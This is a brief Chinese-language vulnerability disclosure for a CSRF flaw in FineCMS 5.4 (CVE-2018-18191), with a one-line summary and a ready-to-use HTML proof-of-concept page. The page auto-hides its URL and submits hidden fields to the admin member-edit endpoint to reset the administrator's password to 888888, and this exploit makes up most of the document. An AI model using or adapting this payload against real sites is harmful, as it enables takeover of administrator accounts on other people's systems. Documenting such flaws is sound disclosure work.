### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Finecms_v5.4存在CSRF漏洞可修改管理员账户密码|2018-10-07|踏月留香|[http://www.finecms.net/](http://www.finecms.net/) | [http://down.chinaz.com/soft/32596.htm](http://down.chinaz.com/soft/32596.htm) |5.4| [CVE-2018-18191](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18191)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。   

### POC实现代码如下：  

> exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/admin.php?c=member&m=edit&uid=1" method="POST">
      <input type="hidden" name="page" value="0" />
      <input type="hidden" name="member&#91;email&#93;" value="admin&#64;163&#46;com" />
      <input type="hidden" name="member&#91;name&#93;" value="admin" />
      <input type="hidden" name="member&#91;phone&#93;" value="18888888888" />
      <input type="hidden" name="member&#91;password&#93;" value="888888" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
